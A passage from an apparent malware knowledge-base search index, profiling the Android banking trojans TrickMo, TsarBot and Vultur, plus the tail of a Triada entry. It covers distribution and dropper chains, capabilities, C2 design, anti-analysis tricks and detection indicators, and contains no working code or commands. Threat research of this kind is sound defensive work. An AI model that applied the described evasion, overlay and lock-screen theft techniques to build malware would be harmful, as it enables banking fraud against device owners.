trojan injected through a malicious advertising SDK.</p> <p>2019-2023: Multiple security firms continue to identify Triada pre-installed on budget devices from various manufacturers. Google's Build Test Suite catches some instances before devices ship, but the problem persists in devices sold through channels outside Google's certification program.</p> <p>March-April 2025: Kaspersky publishes a comprehensive analysis of the latest Triada variant (Backdoor.AndroidOS.Triada.z), found on counterfeit smartphones. The new version demonstrates expanded capabilities including cryptocurrency theft ($270,000 confirmed), messenger interception, DNS manipulation, and the ability to attack any application on the device. Over 4,500 infections detected across multiple countries.</p>"},{"location":"malware/families/triada/#related-families","title":"Related Families","text":"<p>Necro follows a similar supply chain approach at the SDK level, compromising legitimate apps through the malicious \"Coral SDK\" to reach 11 million+ users on Google Play. Goldoson also used an SDK-based supply chain attack, affecting 60+ apps with 100M+ downloads. While Triada operates at the firmware level, these families demonstrate the same principle: compromising the software supply chain to reach massive install bases without requiring users to install a malicious app.</p>"},{"location":"malware/families/triada/#references","title":"References","text":""},{"location":"malware/families/trickmo/","title":"TrickMo","text":"<p>TrickMo is an Android banking trojan originally discovered by CERT-Bund in September 2019 and first analyzed by IBM X-Force in March 2020 as a mobile companion to the TrickBot desktop banking trojan. The original TrickMo functioned as a 2FA bypass tool, intercepting one-time passwords sent via SMS or push notifications to German banking customers whose PCs were already infected with TrickBot. It adopted overlay attacks as its primary credential theft method in 2021, marking its transition from a TrickBot companion into a standalone banking trojan. After a period of low activity, TrickMo resurfaced in late 2023 and escalated through 2024 with substantial upgrades. Cleafy documented new variants in September 2024 employing advanced anti-analysis techniques, overlay injection, and a misconfigured C2 that leaked 12 GB of stolen victim data. Cyble reported on its expanded 45-command instruction set, and Zimperium identified 40 variants, 16 droppers, and 22 active C2 servers along with a fake lock screen designed to steal device PINs and unlock patterns.</p>"},{"location":"malware/families/trickmo/#overview","title":"Overview","text":"Attribute Details First Seen September 2019 (CERT-Bund), analyzed March 2020 (IBM X-Force) Status Active, multiple variants in circulation as of late 2024 Type Banking trojan, credential stealer, 2FA bypass Attribution Originally linked to TrickBot operators; relationship unclear in 2024 variants Distribution Phishing, dropper disguised as Google Chrome, TiramisuDropper Aliases TrickBot Mobile, TrickMo 2.0"},{"location":"malware/families/trickmo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>TrickMo began as a purpose-built mobile component for the TrickBot ecosystem. IBM X-Force's 2020 analysis documented how TrickBot infections on Windows machines used man-in-the-browser attacks to prompt victims for their mobile phone number and device type, then delivered a fake \"security app\" that was actually TrickMo. The naming convention mirrors ZitMo (Zeus-in-the-Mobile), a similar 2FA-interception companion developed for the Zeus banking trojan in 2011.</p> <p>The original TrickMo exclusively targeted German banking customers and focused narrowly on intercepting SMS and push notification OTPs. Germany was one of TrickBot's earliest attack markets when it emerged in 2016, and TrickMo served as its mobile extension for defeating German banks' transaction authentication number (TAN) systems. The malware could intercept OTPs, mobile TANs (mTAN), and pushTAN authentication codes, covering the full spectrum of second-factor methods used by German financial institutions.</p> <p>In July 2021, TrickMo adopted overlay attacks as its primary credential theft method, marking a shift from a passive OTP interceptor to an active credential phisher. This change effectively severed its dependency on a desktop TrickBot infection, allowing TrickMo to operate as a standalone banking trojan. From mid-2021 through 2022, activity dropped significantly, with only six samples identified, two of which introduced an expanded set of 40 commands.</p> <p>The 2024 resurgence represents a dramatic expansion in scope and capability. The malware evolved into a full-featured banking trojan with overlay injection, screen recording, device credential theft, accessibility-based automation, and a command set of 45 distinct instructions. The relationship to the original TrickBot group remains unclear, as TrickBot's infrastructure was disrupted by law enforcement in 2022.</p>"},{"location":"malware/families/trickmo/#distribution","title":"Distribution","text":""},{"location":"malware/families/trickmo/#dropper-chain","title":"Dropper Chain","text":"<p>The 2024 TrickMo variants spread through phishing campaigns that deliver a dropper app disguised as Google Chrome. Cleafy documented that the dropper prompts the victim to \"update Google Play Services\" by tapping a confirmation button. Accepting the prompt downloads and installs the TrickMo payload under the name \"Google Services.\" Both the dropper and the payload share the same anti-analysis mechanisms, suggesting coordinated development.</p> Vector Details Phishing Links delivered via SMS and messaging apps directing victims to malicious downloads Dropper app Disguised as Google Chrome, installs TrickMo as \"Google Services\" Social engineering Fake Google Play Services update prompt triggers payload installation TiramisuDropper Session-based package installer that bypasses Android 13+ accessibility restrictions"},{"location":"malware/families/trickmo/#tiramisudropper-and-android-13-bypass","title":"TiramisuDropper and Android 13+ Bypass","text":"<p>Android 13 introduced Restricted Settings, which prevents sideloaded apps from requesting accessibility service permissions. This restriction specifically targets apps installed outside of official stores by checking the installation method. Apps installed through session-based package installers (the method used by legitimate app stores) are exempt from this restriction.</p> <p>TrickMo operators leverage TiramisuDropper, a malware loader that uses session-based package installer APIs to install the payload in a way that mimics a legitimate app store installation. Because the payload appears to have been installed through a session-based installer, Android's Restricted Settings do not block it from requesting accessibility permissions. Data collected from April through December 2024 shows TiramisuDropper facilitating distribution of multiple malware families, with Hook at 29.9% of observed infections, TgToxic at 22%, and TrickMo at 14.8%.</p>"},{"location":"malware/families/trickmo/#original-distribution-2019-2020","title":"Original Distribution (2019-2020)","text":"<p>The original TrickMo was not distributed independently. TrickBot infections on Windows desktops used man-in-the-browser web injection attacks to display a prompt within the victim's online banking session, requesting their phone number and device type. The victim then received an SMS with a link to download a fake \"security app\" for their bank. This delivery model required an active TrickBot infection as a prerequisite, making TrickMo entirely dependent on the desktop component for distribution.</p>"},{"location":"malware/families/trickmo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/trickmo/#core-features","title":"Core Features","text":"Capability Implementation Overlay injection HTML-based fake login pages displayed over targeted banking and crypto apps OTP interception Captures SMS messages and push notifications containing authentication codes Screen recording Records device screen to capture credentials and activity Fake lock screen HTML page mimicking Android unlock screen to steal PIN or pattern Keyguard dismissal Automatically dismisses device lock screen Permission auto-accept Grants itself permissions without user interaction via accessibility service Remote control Operator can interact with the device through accessibility service Notification interception Reads and hides notifications to capture and suppress 2FA codes Clicker automation Auto-executes predefined actions on targeted apps via accessibility service Data exfiltration Steals credentials, photos, call logs, and device information USSD execution Initiates USSD service calls on the victim's behalf Self-update Downloads and applies updates to its own configuration and code"},{"location":"malware/families/trickmo/#fake-lock-screen","title":"Fake Lock Screen","text":"<p>The fake lock screen is TrickMo's most distinctive 2024 addition. Zimperium's analysis revealed that TrickMo displays an HTML page hosted on an external server in full-screen mode, perfectly mimicking the device's native Android unlock prompt. When the victim enters their PIN or draws their unlock pattern, the page transmits the captured credential along with the device's Android ID to a PHP script on the attacker's server.</p> <p>The fake lock screen is rendered as a deceptive UI that matches the device's actual lock type. With the device unlock credential in hand, operators can access the device during periods when the victim is not actively using it, enabling unattended on-device fraud. This technique is particularly valuable because it gives attackers the ability to unlock the device remotely, approve transactions, and interact with banking apps without the victim's knowledge.</p>"},{"location":"malware/families/trickmo/#overlay-injection","title":"Overlay Injection","text":"<p>TrickMo uses HTML overlay pages to phish credentials for targeted applications. The C2 server delivers overlay configurations through a <code>SaveHtml</code> command that pairs a target package name with an overlay URL. When a targeted app moves to the foreground, TrickMo injects a full-screen HTML page over the legitimate interface, capturing any credentials the victim enters.</p> <p>Cleafy found that operators had created overlay pages targeting services including Binance, Alpha Bank, and ATB Mobile, among others. The full target list spans banking apps (HSBC, Lloyds Bank, ING, and numerous regional banks), cryptocurrency platforms (MetaMask, Blockchain.com, Binance), financial services (PayPal, Skrill), and widely-used consumer apps (Facebook, Netflix, AliExpress, Uber, Gmail).</p>"},{"location":"malware/families/trickmo/#clicker-automation","title":"Clicker Automation","text":"<p>TrickMo uses a <code>clicker.json</code> configuration file to automate actions via the accessibility service. This file contains package names and corresponding filters and actions that define what TrickMo should do when specific applications are in the foreground. The Clicker function preloads a set of target applications defined by the malware author. When one of these applications launches, TrickMo auto-clicks through UI elements, executes predefined workflows, and performs actions on the device without the victim's knowledge.</p> <p>Key Clicker operations include automatically accepting permission dialogs for the malware, navigating through system settings to grant itself additional access, and interacting with banking app interfaces during fraud sessions. The <code>clicker.json</code> file contains German language settings, reflecting TrickMo's roots, but targets both system and utility applications across the device.</p>"},{"location":"malware/families/trickmo/#accessibility-event-logging","title":"Accessibility Event Logging","text":"<p>The 2024 variants shifted away from screen recording via the MediaProjection API in favor of collecting accessibility event logs. This approach captures data from running applications that TrickMo initiates through the Clicker function, gathering text content, UI element states, and user interactions. The collected accessibility event log data is compressed into a ZIP file and exfiltrated to the C2 server. This method is stealthier than screen recording because it does not trigger the Android screen recording indicator that users might notice.</p>"},{"location":"malware/families/trickmo/#expanded-command-set","title":"Expanded Command Set","text":"<p>Cyble's analysis documented 45 commands supported by the 2024 variants, a substantial increase from the original TrickMo's limited instruction set. The expanded commands cover the following categories:</p> Category Capabilities Credential theft Overlay injection management, screen content capture, accessibility event logging Surveillance Screenshot capture, photo/video recording, call log collection, SMS harvesting Device manipulation Lock/unlock screen, disable notifications, adjust settings, simulate button presses Communication Send SMS from victim device, initiate USSD calls Module management Download runtime modules, update configuration files, self-update Data exfiltration Upload credentials, photos, device info, accessibility logs to C2 Self-maintenance Uninstall, modify configuration, update clicker.json"},{"location":"malware/families/trickmo/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for overlay triggering, clicker automation, event logging, permission auto-accept, and remote control SYSTEM_ALERT_WINDOW Display overlay injections and fake lock screen in full-screen mode READ_SMS Read SMS messages for OTP interception RECEIVE_SMS Intercept incoming SMS in real-time SEND_SMS Send SMS from victim device READ_PHONE_STATE Device fingerprinting and phone number collection CAMERA Remote photo and video capture READ_CALL_LOG Harvest call history INTERNET HTTP-based C2 communication RECEIVE_BOOT_COMPLETED Persistence across device reboots FOREGROUND_SERVICE Maintain persistent background operation REQUEST_INSTALL_PACKAGES Dropper installs main payload WAKE_LOCK Keep device awake during remote sessions and data exfiltration <p>The original 2019-2020 TrickMo also set itself as the default SMS application on the device, giving it near-total control over SMS messages. This allowed it to read, intercept, and suppress incoming OTPs before the victim could see them.</p>"},{"location":"malware/families/trickmo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/trickmo/#anti-analysis-mechanisms","title":"Anti-Analysis Mechanisms","text":"<p>Cleafy documented two anti-analysis techniques introduced in the 2024 variants.</p> <p>Malformed ZIP files: The APK file is manipulated by adding directories with the same names as critical files such as <code>AndroidManifest.xml</code> and <code>classes.dex</code>. When security researchers or automated analysis tools attempt to extract the APK, the unzip operation can overwrite these critical files with the identically named directories, causing decompilation failures in many automated analysis pipelines. Tools like <code>apktool</code> and standard ZIP extractors produce errors or incomplete outputs when encountering this structure.</p> <p>JSONPacker: TrickMo uses JSONPacker for payload obfuscation, adding another layer that must be unpacked before analysis can proceed. The combination of malformed ZIP structures and JSONPacker obfuscation creates a multi-layered defense against automated analysis and sandbox detection. Both the dropper and the main payload employ these same techniques, indicating they are part of a shared build process.</p>"},{"location":"malware/families/trickmo/#c2-communication","title":"C2 Communication","text":"<p>TrickMo communicates with its C2 server over HTTP. The initial registration message is an HTTP POST request to the <code>/c</code> endpoint, with the body containing a JSON payload that includes detailed information about the infected device: phone number, device model, and a comprehensive list of installed applications. The C2 server uses this application list to determine which overlay injection pages to deploy, matching installed apps against its library of phishing templates.</p> Component Details Protocol HTTP POST to <code>/c</code> endpoint Registration JSON payload with device fingerprint, phone number, model, and installed app list Command delivery C2 responds with commands; <code>SaveHtml</code> delivers overlay injection targets Overlay hosting HTML phishing pages hosted on C2 server, loaded in full-screen WebView Configuration <code>clicker.json</code> delivered from C2, defines accessibility automation targets Data exfiltration Credentials, photos, accessibility logs uploaded to C2 endpoints IP tracking C2 maintains IP list files updated on each successful credential exfiltration"},{"location":"malware/families/trickmo/#c2-data-leak","title":"C2 Data Leak","text":"<p>Cleafy's investigation exposed critical misconfigurations in TrickMo's C2 infrastructure. The C2 servers had no authentication mechanism protecting access to exfiltrated data. Anyone with knowledge of the specific endpoints, which were easily guessable, could access the full contents of the stolen data stores.</p> <p>The exposed data totaled over 12 GB and included:</p> <ul> <li>Stolen usernames and passwords stored in CSV files</li> <li>Personal photos taken from compromised devices, including identity documents such as passports and credit cards</li> <li>Device logs and operation records</li> <li>HTML files used for overlay attacks against banking and cryptocurrency platforms</li> <li>IP list files that were regularly updated whenever the malware successfully exfiltrated credentials</li> </ul> <p>Zimperium confirmed approximately 13,000 unique IP addresses belonging to victims within these C2 directories. The IP list files contained millions of records, indicating the extensive number of compromised devices and the scale of credential theft across active campaigns. This misconfiguration meant that not only were the TrickMo operators collecting victim data, but that data was simultaneously exposed to any other threat actor who discovered the C2 endpoints.</p>"},{"location":"malware/families/trickmo/#accessibility-service-dependency","title":"Accessibility Service Dependency","text":"<p>TrickMo relies heavily on the Android accessibility service for its core operations. With accessibility permissions, the malware can:</p> <ul> <li>Monitor foreground applications to trigger overlay injections at the right moment</li> <li>Intercept and hide notifications to capture and suppress 2FA codes</li> <li>Auto-accept permission dialogs to grant itself additional access without user interaction</li> <li>Dismiss the device keyguard to unlock the screen</li> <li>Capture accessibility event data from all running applications</li> <li>Execute the Clicker automation for interacting with UI elements</li> <li>Simulate user interactions for remote control and on-device fraud</li> </ul> <p>The shift from MediaProjection-based screen recording to accessibility event logging in the 2024 variants reflects an adaptation to Android's increasing visibility around screen recording. The accessibility approach is functionally equivalent for credential capture while avoiding the screen recording notification that Android displays to users.</p>"},{"location":"malware/families/trickmo/#original-trickmo-technical-design-2019-2020","title":"Original TrickMo Technical Design (2019-2020)","text":"<p>The original TrickMo used a different technical approach from the 2024 variants. IBM X-Force documented that it used screen recording as its primary method for capturing TAN codes, which allowed it to defeat pushTAN app validations where the one-time code was displayed within a banking app rather than sent via SMS. During OTP capture operations, TrickMo activated a fake Android update screen to mask its activity, preventing the victim from seeing the device being manipulated. The malware would set itself as the default SMS app, giving it complete control over incoming and outgoing messages.</p>"},{"location":"malware/families/trickmo/#target-regions","title":"Target Regions","text":"Phase Period Regions Original 2019-2020 Germany exclusively Overlay transition 2021 Germany primarily, beginning to expand Resurgence 2024 Canada, UAE, Turkey, Germany, India, US, South Africa, Netherlands <p>The 2024 expansion beyond Germany reflects TrickMo's evolution from a TrickBot companion tool into an independent banking trojan. Zimperium confirmed at least 13,000 compromised devices, with the highest concentration in Canada. The actual victim count is likely higher given that not all C2 servers were exposed.</p> <p>The targeted application list spans multiple verticals and regions:</p> Category Examples European banking HSBC, Lloyds Bank, ING, Alpha Bank, ATB Mobile Cryptocurrency Binance, MetaMask, Blockchain.com Financial services PayPal, Skrill Consumer apps Facebook, Netflix, AliExpress, Uber, Gmail <p>The <code>clicker.json</code> configuration file retains German language settings from TrickMo's origins, but the overlay injection targets now span banking applications across multiple continents. India emerged as a significant target market, alongside traditional European targets and new expansion into North America and the Middle East.</p>"},{"location":"malware/families/trickmo/#evolution","title":"Evolution","text":"Period Phase Key Changes September 2019 Discovery CERT-Bund identifies TrickMo as TrickBot's mobile companion targeting German banks March 2020 First analysis IBM X-Force documents 2FA bypass via screen recording, SMS interception, fake update screen 2020-2021 Active campaigns TrickBot delivers TrickMo to German banking customers via web injection July 2021 Overlay adoption TrickMo adopts overlay attacks as primary credential theft method, becomes standalone 2021-2022 Low activity Only six samples identified; two introduce expanded 40-command set September 2023 Resurgence begins Three new TrickMo instances detected after period of inactivity September 2024 Major upgrade Cleafy documents anti-analysis (malformed ZIP, JSONPacker), overlay injection, dropper chain, C2 data leak September 2024 Command expansion Cyble documents 45-command set, clicker automation, accessibility event logging October 2024 Scale revealed Zimperium identifies 40 variants, 16 droppers, 22 C2 servers, fake lock screen for PIN theft, 13,000+ victims"},{"location":"malware/families/trickmo/#notable-campaigns","title":"Notable Campaigns","text":"<p>September 2019: CERT-Bund first identifies TrickMo samples targeting German banking customers. The malware operates as a mobile component of TrickBot, intercepting SMS and push notification OTPs sent by German banks.</p> <p>March 2020: IBM X-Force publishes the first detailed analysis of TrickMo, documenting its role as a 2FA bypass companion to TrickBot. The analysis reveals that TrickBot's Windows infections use man-in-the-browser attacks to socially engineer victims into installing the mobile component. Screen recording defeats pushTAN protections that SMS interception alone cannot bypass.</p> <p>July 2021: TrickMo adopts overlay attacks as its primary credential theft technique, marking the transition from TrickBot companion to standalone banking trojan. This shift reduces the malware's dependency on a desktop infection for initial credential theft.</p> <p>September 2023: Three new TrickMo instances appear after an extended period of low activity, signaling the beginning of the resurgence that would escalate through 2024.</p> <p>September 2024: Cleafy discloses new TrickMo variants with advanced anti-analysis mechanisms (malformed ZIP files, JSONPacker), overlay injection for banking and cryptocurrency apps, and a dropper disguised as Google Chrome. The investigation also uncovers misconfigured C2 servers leaking 12 GB of stolen victim data, including passports, credit card images, and credentials stored in plaintext CSV files.</p> <p>September 2024: Cyble reports on TrickMo's resurgence, documenting the expanded 45-command instruction set, clicker automation via <code>clicker.json</code>, accessibility event logging replacing screen recording, new overlay injection capabilities, and runtime module downloading.</p> <p>October 2024: Zimperium publishes a deep dive identifying 40 TrickMo variants, 16 droppers, and 22 C2 servers. The analysis reveals the fake lock screen mechanism for stealing device PINs and unlock patterns, and confirms at least 13,000 compromised devices across Canada, the UAE, Turkey, and Germany. The fragmented infrastructure, with 22 separate C2 servers, suggests either multiple independent operators or a single group maintaining operational compartmentalization.</p>"},{"location":"malware/families/trickmo/#detection","title":"Detection","text":"Indicator Type Details Malformed APK ZIP structure containing directories named <code>AndroidManifest.xml</code> or <code>classes.dex</code> that cause extraction failures JSONPacker Payload obfuscation layer that must be unpacked before analysis Dropper masquerading App presenting as Google Chrome that prompts for \"Google Play Services\" update Accessibility abuse App requesting accessibility with no legitimate UX justification; clicker automation on system apps Fake lock screen Full-screen HTML page mimicking device unlock screen, transmitting PIN/pattern to external PHP script Overlay injection <code>TYPE_APPLICATION_OVERLAY</code> windows rendered over banking, crypto, and consumer apps C2 pattern HTTP POST to <code>/c</code> endpoint with JSON device fingerprint payload Default SMS takeover App setting itself as default SMS handler (original variant)"},{"location":"malware/families/trickmo/#related-families","title":"Related Families","text":"<p>TrickMo's origin as a desktop trojan companion mirrors the ZitMo (Zeus-in-the-Mobile) model from 2011, where mobile malware existed solely to intercept 2FA codes for a PC-based banking trojan. The 2024 TrickMo has outgrown this model entirely, operating as a standalone threat with capabilities rivaling dedicated Android banking trojans.</p> <p>The fake lock screen technique for stealing device unlock credentials parallels TsarBot's LockTypeDetector feature, which similarly deploys a fake lock screen to capture PINs and patterns. Both families use this stolen credential to enable unattended device access for on-device fraud.</p> <p>TrickMo's overlay injection and credential theft approach places it alongside Cerberus, Ermac, Godfather, and Xenomorph in the category of overlay-based banking trojans. The anti-analysis techniques (malformed ZIP, JSONPacker) represent a more sophisticated evasion approach than most families in this category employ.</p> <p>The use of TiramisuDropper for bypassing Android 13+ accessibility restrictions connects TrickMo to other families using the same loader, including Hook and TgToxic. This shared dropper infrastructure suggests either a common supply chain or a dropper-as-a-service model available to multiple malware operators.</p> <p>The C2 server misconfiguration that exposed 12 GB of victim data echoes similar operational security failures seen across the Android malware landscape, where rapid deployment and infrastructure scaling often outpace the operators' security practices.</p>"},{"location":"malware/families/trickmo/#references","title":"References","text":"<ul> <li>IBM X-Force - TrickBot Pushing a 2FA Bypass App to Bank Customers in Germany (March 2020)</li> <li>Cleafy - A New TrickMo Saga: From Banking Trojan to Victim's Data Leak (September 2024)</li> <li>Cyble - TrickMo's Return: Banking Trojan Resurgence with New Features (September 2024)</li> <li>Zimperium - Expanding the Investigation: Deep Dive into Latest TrickMo Samples (October 2024)</li> <li>MITRE ATT&amp;CK - TrickMo (S0427)</li> </ul>"},{"location":"malware/families/tsarbot/","title":"TsarBot","text":"<p>TsarBot is an Android banking trojan discovered by Cyble in March 2025 targeting over 750 applications across banking, finance, cryptocurrency, e-commerce, and social media sectors. It spreads through phishing sites impersonating financial platforms, deploys via a dropper disguised as Google Play Services, and uses overlay attacks combined with on-device fraud capabilities to steal credentials and execute unauthorized transactions. TsarBot communicates with its C2 infrastructure over WebSocket connections across four dedicated ports, supports roughly 30 server-issued commands for real-time device control, and conceals its fraudulent activity behind a black overlay screen.</p>"},{"location":"malware/families/tsarbot/#overview","title":"Overview","text":"Attribute Details First Seen March 2025 Status Active Type Banking trojan, on-device fraud Attribution Suspected Russian-speaking developer Distribution Phishing sites, dropper disguised as Google Play Services"},{"location":"malware/families/tsarbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble's analysis identified Russian-language log entries within the malware, suggesting a Russian-speaking developer or team. The name \"TsarBot\" reflects this suspected origin. TsarBot arrived as a capable threat from its first observed samples, with a broad target list spanning multiple continents and application categories from the outset.</p> <p>The overlay-based credential theft approach places TsarBot in the same operational category as families like Cerberus, Ermac, and Hook, though no direct code lineage to these families has been established. TsarBot's WebSocket-based C2 architecture and dedicated port structure differentiate it from the HTTP-based communication patterns common in older banking trojan families.</p>"},{"location":"malware/families/tsarbot/#distribution","title":"Distribution","text":"<p>TsarBot spreads through phishing sites that impersonate legitimate financial platforms. Cyble observed one campaign using a phishing site mimicking the Photon Sol token trading platform, offering a fake download option that the legitimate site does not provide. The downloaded dropper disguises itself as Google Play Services and installs the TsarBot payload.</p> Vector Details Phishing sites Fake financial platform websites offering malicious APK downloads Dropper Disguised as Google Play Services to appear legitimate Social engineering Lures tied to cryptocurrency trading and financial services"},{"location":"malware/families/tsarbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/tsarbot/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks Fake login pages over 750+ banking, crypto, e-commerce, and social media apps Screen capture Streams screen content to C2 via WebSocket on port 9002 Remote device control Simulates taps, swipes, and credential entry for on-device fraud Black overlay screen Hides fraudulent on-screen activity from the victim Lock grabbing Captures device unlock PIN, password, or pattern via fake lock screen Keylogging Records keystrokes including usernames, passwords, and card details SMS interception Captures incoming SMS messages including 2FA codes On-device fraud Executes unauthorized transactions directly on the compromised device"},{"location":"malware/families/tsarbot/#overlay-attacks","title":"Overlay Attacks","text":"<p>TsarBot's primary credential theft mechanism uses overlay attacks targeting over 750 applications. The target list spans regional banking apps from countries including France, Poland, the United Kingdom, India, the UAE, and Australia, along with global cryptocurrency exchanges, e-commerce platforms, and social media applications. When a targeted app launches, TsarBot displays a pixel-perfect fake login page on top of the legitimate app, capturing credentials as the victim enters them.</p>"},{"location":"malware/families/tsarbot/#lock-grabbing","title":"Lock Grabbing","text":"<p>TsarBot includes a LockTypeDetector feature that uses the accessibility service to determine the device's lock type by detecting on-screen text such as \"PIN area,\" \"Device password,\" or pattern indicators. On the first <code>USER_PRESENT</code> broadcast after installation, TsarBot loads a fake lock screen matching the detected lock type and captures the victim's unlock credential. This stolen PIN, password, or pattern enables the operator to unlock the device during remote access sessions.</p>"},{"location":"malware/families/tsarbot/#on-device-fraud","title":"On-Device Fraud","text":"<p>TsarBot can execute fraudulent transactions directly on the victim's device rather than replaying stolen credentials from a separate system. The malware receives approximately 30 commands from the C2 server focused on screen control: simulating gestures, entering text, navigating through banking app workflows, and initiating transfers. During these sessions, TsarBot activates a black overlay screen to hide the activity from the victim, who sees only a dark display and assumes the device is idle.</p>"},{"location":"malware/families/tsarbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/tsarbot/#websocket-c2-architecture","title":"WebSocket C2 Architecture","text":"<p>TsarBot's C2 communication is built entirely on WebSocket, distinguishing it from most Android banking trojans that rely on HTTP or HTTPS. The malware connects to the C2 server across four dedicated ports, each serving a specific function.</p> Port Function 9001 Primary command channel for receiving instructions and sending stolen data 9002 Screen capture stream transmission 9004 Overlay attack coordination and injection target delivery 9030 Additional command and data channel <p>This multi-port WebSocket design enables persistent, low-latency bidirectional communication between the malware and the operator, supporting real-time screen streaming and interactive device control required for on-device fraud.</p>"},{"location":"malware/families/tsarbot/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>TsarBot depends on the Android accessibility service for most of its core functionality. Once the victim grants accessibility permissions, the malware can monitor foreground applications to trigger overlay injections, detect and interact with UI elements for automated fraud, capture keystrokes, determine device lock type, and intercept notifications containing authentication codes.</p>"},{"location":"malware/families/tsarbot/#screen-capture","title":"Screen Capture","text":"<p>When the C2 sends the <code>REQUEST_CAPTURE</code> command, TsarBot prompts the victim to grant screen capture permissions. Once authorized, the malware initiates a screen capture service that continuously streams the device's display to the C2 server over port 9002. This gives the operator a live view of the device for monitoring victim activity and guiding on-device fraud sessions.</p>"},{"location":"malware/families/tsarbot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for overlay triggering, keylogging, screen capture, lock type detection, and remote device control SYSTEM_ALERT_WINDOW Display overlay injections and black screen during remote sessions READ_SMS Read incoming SMS for OTP interception RECEIVE_SMS Intercept SMS in real-time READ_PHONE_STATE Device fingerprinting INTERNET WebSocket C2 communication across four ports RECEIVE_BOOT_COMPLETED Persistence across reboots REQUEST_INSTALL_PACKAGES Dropper installs main payload"},{"location":"malware/families/tsarbot/#target-regions","title":"Target Regions","text":"Region Targeted Sectors Europe Banking apps in France, Poland, United Kingdom Asia-Pacific Banking and finance apps in India, Australia Middle East Banking apps in the UAE North America Banking, finance, and crypto apps Global Cryptocurrency exchanges, e-commerce, social media platforms <p>The breadth of TsarBot's target list, spanning six continents and multiple industry verticals from its first observed samples, suggests operators with established infrastructure and the intent to scale rapidly. The inclusion of social media and e-commerce alongside traditional banking targets expands the monetization surface beyond pure financial fraud.</p>"},{"location":"malware/families/tsarbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2025: Cyble publishes the initial discovery of TsarBot. The analysis identifies over 750 targeted applications, documents the WebSocket-based C2 architecture across four ports, and details the overlay injection, lock grabbing, screen recording, and on-device fraud capabilities. Cyble highlights a phishing campaign impersonating the Photon Sol cryptocurrency trading platform as a distribution vector, with the dropper masquerading as Google Play Services.</p>"},{"location":"malware/families/tsarbot/#related-families","title":"Related Families","text":"<p>TsarBot's overlay attack model follows the pattern established by Cerberus and continued through Ermac, Hook, and Godfather, all of which use fake login pages injected over targeted banking applications. However, TsarBot's WebSocket C2 design is a departure from the HTTP-based approaches used by most of these families.</p> <p>The on-device fraud capability, where the malware executes transactions directly on the compromised device rather than replaying stolen credentials elsewhere, aligns TsarBot with families like Octo and Hook that also support real-time remote access and interactive device control. The black overlay screen used to conceal fraud sessions is a technique shared with Octo, Hook, and Crocodilus.</p> <p>TsarBot's lock grabbing via fake lock screens is a technique also employed by TrickMo, which uses a similar HTML-based fake unlock screen to capture device PINs and patterns.</p>"},{"location":"malware/families/tsarbot/#references","title":"References","text":"<ul> <li>Cyble - TsarBot: Using overlay attacks targeting BFSI sector (March 2025)</li> </ul>"},{"location":"malware/families/vultur/","title":"Vultur","text":"<p>Vultur is an Android banking trojan that pioneered real-time screen streaming over VNC as its primary credential-theft mechanism, deliberately avoiding the overlay injection approach used by every other banking trojan at the time. Discovered by ThreatFabric in March 2021, Vultur uses AlphaVNC for screen recording and ngrok for tunneling the VNC connection through NATs and firewalls. Its 2024 update added extensive accessibility-based remote control, file management, and app blocking capabilities, while maintaining the VNC core. Distribution relies on the Brunhilda dropper-as-a-service (DaaS) operation and, more recently, TOAD (telephone-oriented attack delivery) combining smishing with voice phishing.</p>"},{"location":"malware/families/vultur/#overview","title":"Overview","text":"Attribute Details First Seen March 2021 Status Active (2024 update) Type Banking trojan, RAT, screen streaming Aliases None widely used Attribution Distributed via Brunhilda DaaS; operator unknown Distribution Google Play (Brunhilda droppers), smishing + TOAD"},{"location":"malware/families/vultur/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Vultur in late March 2021 and named it for the \"full visibility\" it grants operators over victim devices through VNC. At the time, every Android banking trojan relied on overlay injection as the primary credential-theft technique. Vultur broke this pattern by recording the screen in real time, capturing whatever the user typed into any app without needing app-specific inject templates.</p> <p>Vultur has no known code-level relationship to other banking trojan families. Its connection to the Brunhilda dropper operation provides the distribution layer: ThreatFabric documented Brunhilda as a DaaS that places trojanized utility apps on Google Play to deliver various banking trojan payloads, including Vultur.</p> <p>NCC Group's Fox-IT published an updated analysis in March 2024 documenting a significant new version with expanded remote control capabilities, encrypted payloads, and a shift toward TOAD-based distribution.</p>"},{"location":"malware/families/vultur/#distribution","title":"Distribution","text":""},{"location":"malware/families/vultur/#brunhilda-droppers-2021-2023","title":"Brunhilda Droppers (2021-2023)","text":"<p>Vultur's primary distribution channel has been the Brunhilda DaaS, which places dropper apps on Google Play disguised as authenticator tools, productivity apps, and fitness trackers.</p> Date Dropper Disguise Installs Source 2021 Authenticator, fitness apps 5,000+ ThreatFabric 2022 Various utility apps Thousands ThreatFabric"},{"location":"malware/families/vultur/#toad-distribution-2024","title":"TOAD Distribution (2024)","text":"<p>The 2024 version shifted to a social engineering chain combining SMS and voice calls:</p> <ol> <li>Victim receives an SMS about an unauthorized transaction</li> <li>SMS instructs the victim to call a provided number</li> <li>A human operator (the attacker) answers and persuades the victim to \"secure their account\"</li> <li>A second SMS arrives with a download link</li> <li>The link serves a trojanized McAfee Security app containing the Vultur payload</li> </ol> <p>Fox-IT documented this TOAD chain, noting the McAfee impersonation and the multi-stage social engineering as a significant evolution from passive Play Store dropper distribution.</p>"},{"location":"malware/families/vultur/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/vultur/#version-evolution","title":"Version Evolution","text":"Version Period Key Capabilities v1 March 2021 AlphaVNC screen streaming, ngrok tunneling, accessibility keylogging v2 (2024 update) March 2024 All v1 + accessibility remote control, file manager, app blocking, encrypted C2, encrypted payloads"},{"location":"malware/families/vultur/#v1-core-screen-streaming","title":"v1 Core (Screen Streaming)","text":"Capability Implementation Screen recording AlphaVNC server running on-device Remote tunneling ngrok exposes VNC server through NAT/firewall Keylogging Accessibility service captures text input events Target detection Accessibility monitors foreground app, starts recording when target opens SMS interception Reads incoming SMS for 2FA codes <p>The VNC approach means Vultur captures credentials from any app, not just those with pre-built overlay 